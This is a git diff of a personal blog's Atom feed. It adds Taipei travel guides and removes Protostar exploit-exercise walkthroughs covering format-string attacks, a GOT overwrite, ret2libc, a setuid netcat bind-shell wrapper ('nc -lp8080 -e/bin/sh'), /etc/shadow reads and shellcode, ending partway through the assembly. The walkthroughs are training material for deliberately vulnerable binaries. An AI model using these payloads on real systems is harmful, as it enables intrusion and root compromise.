@@ -4,7 +4,7 @@
   <title><![CDATA[Louis Li]]></title>
   <link href="http://louisrli.github.io/atom.xml" rel="self"/>
   <link href="http://louisrli.github.io/"/>
-  <updated>2015-07-11T00:17:49+08:00</updated>
+  <updated>2015-08-20T22:49:10+08:00</updated>
   <id>http://louisrli.github.io/</id>
   <author>
     <name><![CDATA[Louis Li]]></name>
@@ -12,6 +12,71 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Best Meat and Rice in Taipei: Barbecue Pork Rice (招牌烤肉饭)]]></title>
+    <link href="http://louisrli.github.io/blog/2015/08/17/meat-and-rice-zhaopaikaoroufan/"/>
+    <updated>2015-08-17T00:00:00+08:00</updated>
+    <id>http://louisrli.github.io/blog/2015/08/17/meat-and-rice-zhaopaikaoroufan</id>
+    <content type="html"><![CDATA[<p>TODO intro</p>
+
+<p>I have a <a href="https://www.youtube.com/playlist?list=PLtD-FIua473Cf6Ylh3PeoEmoq3c6BJH0S">travel-related YouTube
+channel</a> on life in Taiwan.
+Subscribe!</p>
+
+<!-- more -->
+
+<h2 id="directions">Directions</h2>
+
+<p>The closest subway exit is Taipei Main Station exit M6 (Caesar Park Hotel). </p>
+
+<p>Google maps link</p>
+
+<h2 id="signature-dish">Signature Dish</h2>
+
+<h2 id="menu">Menu</h2>
+
+<p><em>Last updated: August 2015</em></p>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Yangmingshan Transportation (阳明山)]]></title>
+    <link href="http://louisrli.github.io/blog/2015/08/11/yangmingshan/"/>
+    <updated>2015-08-11T00:00:00+08:00</updated>
+    <id>http://louisrli.github.io/blog/2015/08/11/yangmingshan</id>
+    <content type="html"><![CDATA[<p>This is an English guide for transportation to <a href="http://en.wikipedia.org/wiki/Yangmingshan">Yangmingshan
+(阳明山)</a>, a national park north of Taipei. 
+Yangmingshan is a popular destination for locals and tourists, containing numerous hiking trails and
+hot springs.</p>
+
+<p>I have a <a href="https://www.youtube.com/playlist?list=PLtD-FIua473Cf6Ylh3PeoEmoq3c6BJH0S">travel-related YouTube
+channel</a> on life in Taiwan.
+Subscribe!</p>
+
+<!-- more -->
+
+<h2 id="travel-to-yangmingshan">Travel to Yangmingshan</h2>
+
+<p>The easiest way to reach Yangmingshan is by taking the <strong>260 bus from Taipei Main Station</strong>
+to the very last stop. <strong>The bus stops outside exit M1.</strong> The second-to-last stop also contains the phrase “Yangmingshan” – make
+sure to get off at the final stop.</p>
+
+<p>The 260 bus also runs along North Zhongshan Road (中山北路). It may be more convenient to find a 260
+bus stop along this road rather than going to Taipei Main Station.</p>
+
+<p><strong>The fare is about 30 NTD</strong>. If using an Easy Card, swipe the card when going both on and off the bus.</p>
+
+<h2 id="travel-within-yangmingshan">Travel within Yangmingshan</h2>
+
+<p>The internal 108 bus runs on stops within Yangmingshan. This small bus makes stops around the whole
+park.</p>
+
+<p><em>Last updated: August 2015</em></p>
+
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[English Guide to Sun Moon Lake (日月潭)]]></title>
@@ -1711,406 +1776,6 @@ iface eth1 inet dhcp</code></pre></div>
 <p>Finally, we can SSH to the virtual machine.</p>
 
 <div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> ssh user@192.168.56.101</code></pre></div>
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Protostar Format String Exploits (Solutions 0-4)]]></title>
-    <link href="http://louisrli.github.io/blog/2012/08/29/protostar-format0/"/>
-    <updated>2012-08-29T00:00:00+08:00</updated>
-    <id>http://louisrli.github.io/blog/2012/08/29/protostar-format0</id>
-    <content type="html"><![CDATA[<h1 id="overview">Overview</h1>
-<p><strong>Protostar</strong> is a series of exercises from <a href="http://exploit-exercises.com/protostar">Exploit Exercises</a>. In addition to three final levels, it has four basic sections: network programming, format strings, heap overflows, and stack overflows.</p>
-
-<p>This post contains solutions and walkthroughs for the four format string levels (“Format”).</p>
-
-<h1 id="solutions">Solutions</h1>
-<p>## Format: Level 0
-<strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/format0">full</a>): Change the value of a stack variable to <code>0xdeadbeef</code> using less than 10 bytes of input.</p>
-
-<p>This exploit shows similarities (sometimes) between format string exploits and buffer overflows.</p>
-
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> ./format0 %64s<span class="k">$(</span>perl -e <span class="s1">&#39;print &quot;\xef\xbe\xad\xde&quot;&#39;</span><span class="k">)</span>
-
-<span class="go">you have hit the target correctly :)</span></code></pre></div>
-
-<!-- more -->
-<p>## Format: Level 1
-<strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/format1">full</a>): Change the value of a global variable, <code>target</code>, to any nonzero value.</p>
-
-<p><code>target</code> is a global variable. To overwrite it, we first find its address using <code>obdjump -t</code> (we could also use <code>nm</code> to save some keystrokes).</p>
-
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> objdump -t format1 <span class="p">|</span> grep target
-<span class="go">08049638 g       0 .bss    00000004            target</span></code></pre></div>
-
-<p>Next, we need to find where the format function expects the first (missing) argument to the format string.</p>
-
-<div class="highlight"><pre><code class="language-text" data-lang="text">Starting program: /opt/protostar/bin/format1 AAAA%08x
-
-Breakpoint 1, __printf (format=0xbffff98f &quot;AAAA%08x&quot;) at printf.c:29
-29      printf.c: No such file or directory.
-in printf.c
-(gdb) x/10xw $esp
-0xbffff768:     0x00000002      0xb7edcf90      0xb7edcf99      0xb7fd6ff4
-0xbffff778:     0xbffff798      0x08048405      0xbffff98f      0x0804960c
-0xbffff788:     0xbffff7b8      0x08048469
-(gdb) x/xw 0xbffff784
-0xbffff784:     0x0804960c
-(gdb) p 0xbffff98f - 0x0bffff784
-$1 = 523</code></pre></div>
-
-<p>An important detail: adding <em>n</em> characters will actually decrease the starting address of the string’s characters by <em>n</em> bytes. Adding one more character decrements the address from <code>0xbffff98f</code> to <code>0xbffff98e</code>. This leaves the location of the first parameter unchanged.</p>
-
-<p>Remember that the offset is calculated <em>relative to the format function</em> (i.e. <code>printf</code>) rather than <code>vuln()</code>.</p>
-
-<div class="highlight"><pre><code class="language-text" data-lang="text">(gdb) run AAAAA%08x
-The program being debugged has been started already.
-Start it from the beginning? (y or n) y
-
-Starting program: /opt/protostar/bin/format1 AAAAA%08x
-
-Breakpoint 1, __printf (format=0xbffff98e &quot;AAAAA%08x&quot;) at printf.c:29
-29      printf.c: No such file or directory.
-in printf.c
-(gdb) x/xw 0xbffff784
-0xbffff784:     0x0804960c</code></pre></div>
-
-<ul>
-  <li><code>0xbffff784</code>: The first argument to the format string.</li>
-  <li><code>0xbffff997 - n</code>: The first character of the format string, where <code>n</code> is the total number of characters in the string. The odd alignment is caused by the null byte.</li>
-</ul>
-
-<p>As seen earlier, the distance between the beginning of the format string (the address of <code>target</code>) and the first argument to the format string (a starting address for “stack popping” additional arguments) is about 500 bytes.</p>
-
-<p>With a few calculations, we can find the correct offset.</p>
-
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> ./format1 <span class="k">$(</span>perl -e <span class="s1">&#39;print &quot;\x38\x96\x04\x08&quot;&#39;</span><span class="k">)</span><span class="s1">&#39;..%128$n&#39;</span>
-<span class="go">8..you have modified the target :)</span></code></pre></div>
-
-<h2 id="format-level-2">Format: Level 2</h2>
-<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/format3">full</a>): Change the value of a global variable, <code>target</code>, to <code>0x40</code>.</p>
-
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> objdump -t format2 <span class="p">|</span> grep target
-<span class="go">080496e4 g     O .bss   00000004              target</span></code></pre></div>
-
-<p>Using the same techniques as before, we find the beginning of the format string in memory. The fourth expected format string argument coincides with the beginning of the format string in memory. We store our target address at the beginning of the format string in order to write to it.</p>
-
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">echo</span> -ne <span class="k">$(</span>perl -e <span class="s1">&#39;print &quot;\xe4\x96\x04\x08&quot;&#39;</span><span class="k">)</span>%4<span class="se">\$</span>08x <span class="p">|</span> ./format2
-<span class="go">080496e4target is 0 :(</span></code></pre></div>
-
-<p>Finally, we calculate the number of bytes needed to write 64 (0x40). The address of <code>target</code> occupies four bytes first, and we need another 60 bytes.</p>
-
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">echo</span> -ne <span class="k">$(</span>perl -e <span class="s1">&#39;print &quot;\xe4\x96\x04\x08&quot;&#39;</span><span class="k">)</span>%60u%4<span class="se">\$</span>n <span class="p">|</span> ./format2
-<span class="go">                                                         512you have modified the target :)</span></code></pre></div>
-
-<h2 id="format-level-3">Format: Level 3</h2>
-<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/format3">full</a>): Change the value of a global variable, <code>target</code>, to <code>0x01025544</code>.</p>
-
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> objdump -t format3 <span class="p">|</span> grep target
-<span class="go">080496f4 g     O .bss   00000004              target</span></code></pre></div>
-
-<p>We calculate the offset between the format function parameters and the characters of the string in the same way as the previous exercises.</p>
-
-<div class="highlight"><pre><code class="language-text" data-lang="text">(gdb) break printf
-Breakpoint 1 at 0x804837c
-(gdb) run
-Starting program: /opt/protostar/bin/format3
-AAAA
-Breakpoint 1, __printf (format=0xbffff5a0 &quot;AAAA\n&quot;) at printf.c:29
-29      printf.c: No such file or directory.
-in printf.c
-(gdb) info frame
-Stack level 0, frame at 0xbffff570:
-eip = 0xb7edcfa2 in __printf (printf.c:29); saved eip 0x8048465
-called by frame at 0xbffff590
-source language c.
-Arglist at 0xbffff568, args: format=0xbffff5a0 &quot;AAAA\n&quot;
-Locals at 0xbffff568, Previous frame&#39;s sp is 0xbffff570
-Saved registers:
-ebx at 0xbffff564, ebp at 0xbffff568, eip at 0xbffff56c
-(gdb) x/3xw 0xbffff568
-0xbffff568:     0xbffff588      0x08048465      0xbffff5a0
-(gdb) x/w 0xbffff570
-0xbffff570:     0xbffff5a0
-(gdb) p 0xbffff5a0 - 0xbffff570
-= 48</code></pre></div>
-
-<p>We can confirm that our offset of 48 (12 * 4 bytes) is correct.</p>
-
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">echo </span>AAAA%12<span class="se">\$</span>x <span class="p">|</span> ./format3
-<span class="go">AAAA41414141</span>
-<span class="go">target is 00000000 :(</span></code></pre></div>
-
-<p>Next, we need to change the value of target to <code>0x01025544</code>. Below is each byte in decimal:</p>
-
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">echo</span> <span class="s2">&quot;ibase=16; 44&quot;</span> <span class="p">|</span> bc
-<span class="go">68</span>
-<span class="gp">$</span> <span class="nb">echo</span> <span class="s2">&quot;ibase=16; 55&quot;</span> <span class="p">|</span> bc
-<span class="go">85</span>
-<span class="gp">$</span> <span class="nb">echo</span> <span class="s2">&quot;ibase=16; 02&quot;</span> <span class="p">|</span> bc
-<span class="go">2</span>
-<span class="gp">$</span> <span class="nb">echo</span> <span class="s2">&quot;ibase=16; 01&quot;</span> <span class="p">|</span> bc
-<span class="go">1</span></code></pre></div>
-
-<p>Finally, we write values to each of the four bytes of <code>target</code>:</p>
-
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">echo</span> <span class="k">$(</span>perl -e <span class="s1">&#39;print &quot;\xf4\x96\x04\x08&quot;&#39;</span><span class="k">)$(</span>perl -e <span class="s1">&#39;print &quot;\xf5\x96\x04\x08&quot;&#39;</span><span class="k">)$(</span>perl -e <span class="s1">&#39;print &quot;\xf6\x96\x04\x08&quot;&#39;</span><span class="k">)$(</span>perl -e <span class="s1">&#39;print &quot;\xf7\x96\x04\x08&quot;&#39;</span><span class="k">)</span><span class="s1">&#39;%52u%12$n%&#39;&#39;17u%13$n&#39;&#39;%173u%14$n&#39;</span> <span class="p">|</span> ./format3
-<span class="go">���                                                   0       3221222848                                                                                                                                                                   3086839796</span>
-<span class="go">you have modified the target :))</span></code></pre></div>
-
-<p>Note that it wasn’t necessary to include the last address, <code>0x080496f7</code>, since the most significant byte (<code>0x01</code>) is written as a consequence of the overflow.</p>
-
-<h2 id="format-level-4">Format: Level 4</h2>
-<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/format4">full</a>): Redirect execution flow to <code>hello()</code> by using a format string exploit.</p>
-
-<p>In this exercise, the offset is only 16 bytes (four parameter arguments). The calculation is omitted as the two previous exercises illustrate the process.</p>
-
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">echo</span> <span class="s1">&#39;AAAA%4$x&#39;</span> <span class="p">|</span> ./format4
-<span class="go">AAAA41414141</span></code></pre></div>
-
-<p>In order to perform this exploit, we’ll <a href="http://www.stanford.edu/~stinson/cs155/rdg/rdg_list.txt">overwrite an entry in global offset table</a>. Specifically, we’ll overwrite the entry of the <code>exit()</code> function (<code>0x08049724</code>) with the address of the <code>hello()</code> function (<code>0x08048b4</code>).</p>
-
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> objdump -TR format4 <span class="p">|</span> grep <span class="nb">exit</span>
-<span class="go">00000000      DF *UND* 00000000  GLIBC_2.0   _exit</span>
-<span class="go">00000000      DF *UND*  00000000  GLIBC_2.0   exit</span>
-<span class="go">08049718 R_386_JUMP_SLOT   _exit</span>
-<span class="go">08049724 R_386_JUMP_SLOT   exit</span>
-<span class="gp">$</span> objdump -t format4 <span class="p">|</span> grep hello
-<span class="go">080484b4 g     F .text  0000001e              hello</span></code></pre></div>
-
-<p>To confirm that our overwrite works correctly, we run a quick test:</p>
-
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">echo</span> <span class="k">$(</span>perl -e <span class="s1">&#39;print &quot;\x24\x97\x04\x08&quot;&#39;</span><span class="k">)</span><span class="s1">&#39;%4$n&#39;</span> &gt; /tmp/format4
-<span class="gp">$</span> gdb -q format4
-<span class="go">Reading symbols from /opt/protostar/bin/format4...done.</span>
-<span class="go">(gdb) run &lt; /tmp/format4</span>
-<span class="go">Starting program: /opt/protostar/bin/format4 &lt; /tmp/format4</span>
-<span class="gp">$</span>�
-<span class="go">Program received signal SIGSEGV, Segmentation fault.</span>
-<span class="go">0x00000004 in ?? ()</span></code></pre></div>
-
-<p>Execution jumped to the address <code>0x00000004</code>, meaning that we’re on the right track. Finally, we use a <strong>short write</strong> (<code>%hn</code>, allowing us to write to two bytes) to overwrite the last two bytes of the GOT entry. This works because both addresses start with <code>0x0804</code> – only the last two bytes need to be changed.</p>
-
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">echo</span> <span class="k">$(</span>perl -e <span class="s1">&#39;print &quot;\x24\x97\x04\x08&quot;&#39;</span><span class="k">)</span><span class="s1">&#39;%33968u%4$hn&#39;</span> <span class="p">|</span> ./format4
-<span class="gp">$</span>
-<span class="go">&lt;lots of whitespace&gt;</span>
-<span class="go">512</span>
-<span class="go">                                                                                                                                                                              code execution redirected! you win</span></code></pre></div>
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Protostar Stack Exploits (Solutions 6-7)]]></title>
-    <link href="http://louisrli.github.io/blog/2012/08/28/protostar-stack2/"/>
-    <updated>2012-08-28T00:00:00+08:00</updated>
-    <id>http://louisrli.github.io/blog/2012/08/28/protostar-stack2</id>
-    <content type="html"><![CDATA[<h1 id="overview">Overview</h1>
-<p><strong>Protostar</strong> is a series of exercises from <a href="http://exploit-exercises.com/protostar">Exploit Exercises</a>. In addition to three final levels, it has four basic sections: network programming, format strings, heap overflows, and stack overflows.</p>
-
-<p>This series of posts contains solutions and walkthroughs for the stack overflow levels (“Stack”). It assumes basic knowledge of systems programming and is meant to serve as a reference for those stuck on certain levels. This is the final post for Stack.</p>
-
-<h1 id="solutions">Solutions</h1>
-<p>## Stack 6
-<strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack6">full</a>): Execute shellcode with a restriction on the return address. This mimics a nonexecutable stack by barring any return addresses of the form <code>0xbfxxxxxx</code>.</p>
-
-<h3 id="utilities">Utilities</h3>
-<p>We’ll add one more script to our utility belt. This will help us quickly make guesses for buffer overflows.</p>
-
-<p><code>~/try-address.sh</code>:</p>
-
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c">#!/bin/bash</span>
-<span class="c"># Takes an offset and unlimited 4-byte addresses and prints it in little-endian order</span>
-<span class="k">if</span> <span class="o">[[</span> <span class="nv">$# </span>-lt <span class="m">2</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
-    <span class="nb">echo</span> <span class="s2">&quot;usage: $0 OFFSET ADDRESS. Example: $0 80 0xdeadbeef 0xf00f00f0&quot;</span>
-    <span class="nb">exit </span>1
-<span class="k">fi</span>
-
-perl -e <span class="s2">&quot;print &#39;A&#39;x$1&quot;</span>
-<span class="nb">shift</span>
-<span class="k">for</span> addr in <span class="nv">$@</span><span class="p">;</span> <span class="k">do</span>
-    <span class="k">for</span> i in <span class="k">$(</span>seq <span class="m">8</span> -2 2<span class="k">)</span><span class="p">;</span> <span class="k">do</span> <span class="nb">echo</span> -ne <span class="s2">&quot;\x${addr:$i:2}&quot;</span><span class="p">;</span> <span class="k">done</span>
-<span class="k">done</span></code></pre></div>
-
-<!-- more -->
-<p>### Solution
-First, we need to find the proper offset for overwriting the return address. The command below reveals that the return address is 16 bytes after the end of the 64 byte buffer, meaning that 80 bytes are needed before overwriting the return address.</p>
-
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="k">for</span> i in <span class="k">$(</span>seq <span class="m">76</span> <span class="m">4</span> 100<span class="k">)</span><span class="p">;</span> <span class="k">do</span> <span class="nb">echo</span> <span class="nv">$i</span><span class="p">;</span> ~/try-address.sh <span class="nv">$i</span> 0xbfffffff <span class="p">|</span> ./stack6<span class="p">;</span> <span class="k">done</span>
-<span class="go">76</span>
-<span class="go">...</span>
-<span class="go">80</span>
-<span class="go">input path please: bzzzt (0xbfffffff)</span>
-<span class="go">84</span>
-<span class="go">...</span></code></pre></div>
-
-<p>For our solution, we’ll be performing a <strong><a href="http://en.wikipedia.org/wiki/Return-to-libc_attack">ret2libc</a></strong> attack. <a href="http://shellblade.net/docs/ret2libc.pdf">This paper</a> by InVoLuNTaRy offers an in-depth description of the tactic (sidenote: it’s one of the most well-written papers that I’ve ever read and well worth the read). The rest of this section assumes that this paper has been read.</p>
-
-<p>First, we find the addresses of the <code>system()</code> and <code>exit()</code> libc functions. <code>exit()</code> isn’t strictly necessary, but since ret2libc ultimately calls two functions, we prefer to return without a segmentation fault.</p>
-
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> gdb -q stack6
-<span class="go">Reading symbols from /opt/protostar/bin/stack6...done.</span>
-<span class="go">(gdb) break main</span>
-<span class="go">Breakpoint 1 at 0x8048500: file stack6/stack6.c, line 27.</span>
-<span class="go">(gdb) run</span>
-<span class="go">Starting program: /opt/protostar/bin/stack6</span>
-
-<span class="go">Breakpoint 1, main (argc=1, argv=0xbffff874) at stack6/stack6.c:27</span>
-<span class="go">27      stack6/stack6.c: No such file or directory.</span>
-<span class="go">in stack6/stack6.c</span>
-<span class="go">(gdb) print system</span>
-<span class="gp">$</span><span class="nv">1</span> <span class="o">=</span> <span class="o">{</span>&lt;text variable, no debug info&gt;<span class="o">}</span> 0xb7ecefb0 &lt;__libc_system&gt;
-<span class="go">(gdb) print exit</span>
-<span class="gp">$</span><span class="nv">2</span> <span class="o">=</span> <span class="o">{</span>&lt;text variable, no debug info&gt;<span class="o">}</span> 0xb7ec50c0 &lt;*__GI_exit&gt;</code></pre></div>
-
-<p>We see that our functions have the following addresses:</p>
-
-<ul>
-  <li><code>system()</code>: <code>0xb7ecefb0</code></li>
-  <li><code>exit()</code>: <code>0xb7ec50c0</code></li>
-</ul>
-
-<p>Given the particular stack layout for a ret2libc attack (described in the InVoLuNTaRy paper), our solution will be of the form:</p>
-
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> ~/try-address.sh <span class="m">80</span> <span class="o">(</span>ENV_VAR_ADDRESS<span class="o">)</span> <span class="o">(</span>EXIT<span class="o">()</span>_ADDRESS<span class="o">)</span> <span class="o">(</span>SYSTEM<span class="o">()</span>_ADDRESS<span class="o">)</span></code></pre></div>
-
-<h4 id="sanity-checks">Sanity checks</h4>
-<p>First, let’s make sure that we can actually execute code.</p>
-
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">export </span><span class="nv">TEST</span><span class="o">=</span>whoami
-<span class="gp">$</span> /home/user/try-address.sh <span class="m">80</span> 0xb7ecefb0 0xb7ec50c0 0xbfffff8a <span class="p">|</span> ./stack6
-<span class="go">input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��AAAAAAAAAAAA���P췊���</span>
-<span class="go">sh: =whoami: not found</span>
-<span class="gp">$</span> /home/user/try-address.sh <span class="m">80</span> 0xb7ecefb0 0xb7ec50c0 0xbfffff8b <span class="p">|</span> ./stack6
-<span class="go">input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��AAAAAAAAAAAA���P췋���</span>
-<span class="go">root</span></code></pre></div>
-
-<h4 id="working-netcat-solution">Working netcat solution</h4>
-<p>There are two obstacles to a working solution.</p>
-
-<ol>
-  <li>Environmental variables with spaces don’t work. All of the following would fail:</li>
-</ol>
-
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">export </span><span class="nv">RUN</span><span class="o">=</span><span class="s2">&quot;nc -lp8080 -e/bin/sh&quot;</span>
-<span class="gp">$</span> <span class="nb">export </span><span class="nv">RUN</span><span class="o">=</span><span class="s2">&quot;cat /etc/shadow&quot;</span>
-<span class="gp">$</span> <span class="nb">export </span><span class="nv">RUN</span><span class="o">=</span><span class="s2">&quot;\&quot;cat /etc/shadow\&quot;&quot;</span></code></pre></div>
-
-<ol>
-  <li><code>system()</code> will drop our root privileges (<a href="http://linux.die.net/man/3/system">man system</a>)</li>
-</ol>
-
-<p>Instead, we can wrap our call to netcat in another C program, naming an executable without spaces and restoring our privileges.</p>
-
-<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#include &lt;stdlib.h&gt;</span>
-
-<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span> <span class="p">{</span>
-    <span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="c1">// These two are necessary, as system() drops privileges</span>
-    <span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
-    <span class="kt">char</span> <span class="o">*</span><span class="n">args</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>  <span class="s">&quot;nc&quot;</span><span class="p">,</span> <span class="s">&quot;-lp8080&quot;</span><span class="p">,</span> <span class="s">&quot;-e/bin/sh&quot;</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="mi">0</span> <span class="p">};</span>
-    <span class="n">execve</span><span class="p">(</span><span class="s">&quot;/bin/nc&quot;</span><span class="p">,</span> <span class="n">args</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
-<span class="p">}</span></code></pre></div>
-
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> gcc ~/netcat.c -o ~/netcat
-<span class="gp">$</span> <span class="nb">export </span><span class="nv">RUN</span><span class="o">=</span>/////////////////////////////////////home/user/netcat   <span class="c"># The slashes are similar to a NOP sled</span>
-<span class="gp">$</span> ~/envaddr RUN
-<span class="go">RUN is at address 0xbfffff9e</span>
-<span class="gp">$</span> /home/user/try-address.sh <span class="m">80</span> 0xb7ecefb0 0xb7ec50c0 0xbfffff9e <span class="p">|</span> ./stack6
-<span class="go">input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��AAAAAAAAAAAA���P췞���</span>
-<span class="go">sh: 192.168.1.10: not found</span></code></pre></div>
-
-<p><code>system()</code> doesn’t seem to be using the contents of our environmental variable. If we look at the environmental variables, though, we see that we were close enough: <code>RUN</code> is the next variable. We then adjust our estimate for the address of <code>RUN</code> by 20 bytes.</p>
-
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> env
-<span class="go">...</span>
-<span class="go">HOME=/home/user</span>
-<span class="go">LOGNAME=user</span>
-<span class="go">SSH_CONNECTION=192.168.1.7 49324 192.168.1.10 22</span>
-<span class="go">RUN=/////////////////////////////////////home/user/netcat</span>
-<span class="go">_=/usr/bin/env</span>
-<span class="gp">$</span> /home/user/try-address.sh <span class="m">80</span> 0xb7ecefb0 0xb7ec50c0 0xbfffffbe <span class="p">|</span> ./stack6
-<span class="go">input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��AAAAAAAAAAAA���P췳���</span>
-<span class="go">&lt;waiting&gt;</span></code></pre></div>
-
-<p>Finally, through a remote machine:</p>
-
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="o">[</span>louis@neutrino ~<span class="o">]</span><span class="nv">$ </span>nc 192.168.1.10 8080
-<span class="go">whoami</span>
-<span class="go">root</span></code></pre></div>
-
-<h2 id="stack-level-7">Stack: Level 7</h2>
-<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack7">full</a>): Execute shellcode with further restrictions on the return address. Any address of the form <code>0xbxxxxxxx</code> raises an error.</p>
-
-<h3 id="overview-1">Overview</h3>
-
-<p>The return value of a function is usually stored in the <code>eax</code> register. The key to this level is the call to <code>return strdup(buf)</code>: this means we can find the buffer (e.g. our shellcode) in the <code>eax</code> register when <code>getpath()</code> returns.</p>
-
-<p>The code restricts us from returning to any code on the bottom of the stack (<code>0xbxxxxxxx</code>) and advises us to return to the <code>.text</code> section. In particular, we’ll want to return to a <code>call eax</code> instruction, which will then call our shellcode.</p>
-
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> objdump -M intel -d stack7 <span class="p">|</span> grep <span class="s2">&quot;call.*eax&quot;</span>
-<span class="go">8048478:       ff 14 85 5c 96 04 08    call   DWORD PTR [eax*4+0x804965c]</span>
-<span class="go">80484bf:       ff d0                   call   eax</span>
-<span class="go">80485eb:       ff d0                   call   eax</span></code></pre></div>
-
-<p>If we play with the numbers like in earlier levels, we’ll find that 80 bytes are needed before the return address. Our buffer overflow will look like this:</p>
-
-<div class="highlight"><pre><code class="language-text" data-lang="text">Buffer start
-      | ---------- Shellcode (n bytes) --------- |
-      | -------- Padding (80 - n bytes) -------- |
-      | -- Return address 0x80484bf (4 bytes) -- |
-Buffer end (84 bytes total)</code></pre></div>
-
-<h3 id="solution">Solution</h3>
-<p>In earlier levels, we found that opening a shell with <code>gets()</code>. However, we can still use it to validate our strategy:</p>
-
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">echo</span> -ne <span class="k">$(</span>cat ~/shell<span class="k">)$(</span>~/try-address.sh <span class="m">49</span> 0x080484bf<span class="k">)</span> <span class="p">|</span> wc -c
-<span class="go">84</span>
-<span class="gp">$</span> <span class="nb">echo</span> -ne <span class="k">$(</span>cat ~/shell<span class="k">)$(</span>~/try-address.sh <span class="m">49</span> 0x080484bf<span class="k">)</span> &gt; /tmp/stack7shell
-<span class="gp">$</span> gdb -q stack7
-<span class="go">Reading symbols from /opt/protostar/bin/stack7...done.</span>
-<span class="go">(gdb) run &lt; /tmp/stack7shell</span>
-<span class="go">Starting program: /opt/protostar/bin/stack7 &lt; /tmp/stack7shell</span>
-<span class="go">input path please: got path ����1�Ph//shh/bin��h-ilsP�̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAA�AAAAAAAAAAAA��</span>
-<span class="go">Executing new program: /bin/dash</span>
-
-<span class="go">Program exited normally.</span></code></pre></div>
-
-<p>If we give it a shot with our <code>nc</code> shellcode, we’ll find the following error: <code>bin/sh: forward host lookup failed: Unknown host</code>. This occurs as a complication from having options passed into the <code>execve</code> call.</p>
-
-<p>We can add another wrapper to the <code>netcat.c</code> used in Level 6 by writing our own shellcode. This shellcode will simply execute <code>/tmp/nc</code>, an alias for a compiled <code>netcat.c</code>. This file, in turn, calls netcat and listens via port 8080.</p>
-
-<p><code>~/sc-tmp-nc.asm</code>:</p>
-
-<div class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="k">BITS</span> <span class="mi">32</span>
-
-<span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
-<span class="nf">push</span> <span class="nb">eax</span>
-<span class="nf">push</span> <span class="mh">0x636e2f2f</span>         <span class="c1">; //nc</span>
-<span class="nf">push</span> <span class="mh">0x706d742f</span>         <span class="c1">; /tmp</span>
-<span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">esp</span>
-<span class="nf">push</span> <span class="nb">eax</span>
-<span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">esp</span>
